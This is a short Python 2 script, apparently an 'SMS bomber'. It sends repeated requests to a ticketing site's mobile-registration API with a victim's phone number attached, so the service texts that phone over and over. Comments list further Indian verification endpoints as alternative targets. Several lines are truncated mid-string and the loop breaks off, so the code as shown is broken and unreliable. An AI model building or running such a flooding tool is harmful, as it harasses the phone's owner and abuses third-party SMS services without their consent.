#python2
#from urllib.request import Request,urlopen
"""
Created on Mon Mar  7 11:15:23 2021

@author: ayrainc
"""
import urllib2,cookielib
#from urllib.parse import urlencode
import platform
import os
import time

try:
    raw_input
except NameError:
    raw_input = input

def banner():
    if platform.system().lower()=="windows":
        os.system("cls")
    else:
        os.system("clear")
    print("bomber using python2")

#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=

#http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=

#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=
def send(num, counter, slep):
    #url = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=","https://t.justdial.com/api/india_api_w>
    url="https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
    #data={"phone":num}
    hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Acc>
    result_url=url+num
    req = urllib2.Request(result_url, headers=hdr)
    for x in range(counter):
        banner()
        #print("Target Number          : 01531999473", num)
        #print("Number of Message Sent : ", x+1)
        page = urllib2.urlopen(req)
        #resp1=Request(result_url)
